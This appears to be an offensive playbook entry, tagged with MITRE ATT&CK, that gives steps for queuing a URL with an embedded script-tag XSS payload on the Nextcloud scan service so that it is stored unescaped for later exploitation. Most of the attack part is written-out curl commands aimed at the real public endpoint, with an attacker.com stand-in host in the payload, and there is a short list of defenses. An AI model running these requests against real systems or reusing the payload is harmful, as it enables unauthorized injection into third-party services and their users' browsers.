---
tags:
  - xss
  - api
  - scan-queue
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:41.792Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 3a33d76e-7ed8-46e1-9217-30d9344b1224
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Queue-Malicious-URL-for-Nextcloud-Scan

## Summary

This procedure submits the malicious URL to the Nextcloud scan queue API, initiating the scanning process and storing the URL in their backend for later retrieval and exploitation.

## Description

The Nextcloud scan engine at scan.nextcloud.com allows anonymous posting of URLs to /api/queue, which fetches status.php from the URL and stores results under a UUID. By submitting a URL with the XSS path, the unescaped data.url gets persisted. This step requires no auth and is public-facing.

## Requirements

1. Malicious URL prepared from previous procedure
2. curl or HTTP client
3. Public access to scan.nextcloud.com

## Defense

Defensive measures and detection strategies:

- Validate and escape all queued URLs
- Rate-limit anonymous scan submissions
- Scan for suspicious paths (e.g., script tags) in URLs
- Log and review queue activity

## Objectives

1. Obtain a UUID for the stored scan
2. Trigger backend fetch of status.php
3. Ensure URL is stored unescaped

## Instructions

### Step 1: POST to Queue API

**Context**: Submit the URL to initiate the scan; repeat if needed for valid results.

**Command** (curl):
```bash
curl -X POST https://scan.nextcloud.com/api/queue -d 'url=http://attacker.com/heh<script>alert(1)/status.php'
```

> This queues the scan and returns a UUID in JSON. Expected output: {"uuid":"<UUID>"}.

### Step 2: Verify Queue

**Context**: Optionally poll for scan start, but typically wait ~1-2 minutes.

**Command** (curl):
```bash
curl https://scan.nextcloud.com/api/result/<UUID>
```

> Checks if scan is processing; initial response may be empty.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- api
- scan-queue
